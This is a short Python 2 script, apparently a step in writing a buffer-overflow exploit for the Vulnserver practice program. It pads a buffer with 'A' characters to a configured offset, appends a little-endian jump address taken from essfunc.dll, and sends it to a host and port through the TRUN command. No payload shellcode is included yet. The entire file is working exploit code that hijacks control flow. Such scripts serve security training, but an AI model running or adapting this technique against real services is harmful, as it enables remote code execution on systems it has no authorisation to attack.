#!/usr/bin/env python2

"""
TODO TODO TODO
"""

import socket
from options import HOST, PORT, SHELLCODE_OFFSET, ESSFUNC_DLL_JMP_LOCATION_LITTLE_ENDIAN

shellcode = ('A' * SHELLCODE_OFFSET)
shellcode += ESSFUNC_DLL_JMP_LOCATION_LITTLE_ENDIAN

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cmd = ('TRUN /.:/' + shellcode)

# print("SEND "+cmd)
s.send(cmd)
print("sent %d bytes" % len(cmd))
s.close()